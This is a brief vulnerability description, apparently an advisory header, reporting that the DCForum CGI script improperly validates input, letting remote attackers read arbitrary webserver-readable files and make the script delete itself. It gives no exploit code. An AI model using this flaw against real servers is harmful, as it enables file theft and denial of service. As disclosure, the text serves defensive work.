# DCForum is a commercial cgi script from DCScripts which is designed to facilitate web-based threaded discussion forums.
#
#The script improperly validates user-supplied input, which allows the remote viewing of arbitrary files on the host which are readable by user 'nobody' or the webserver. Additionally, it has been reported that the dcforum.cgi script can be made to delete itself if the attacker attempts to read its source code using this method, effectively permitting a denial-of-service attack.
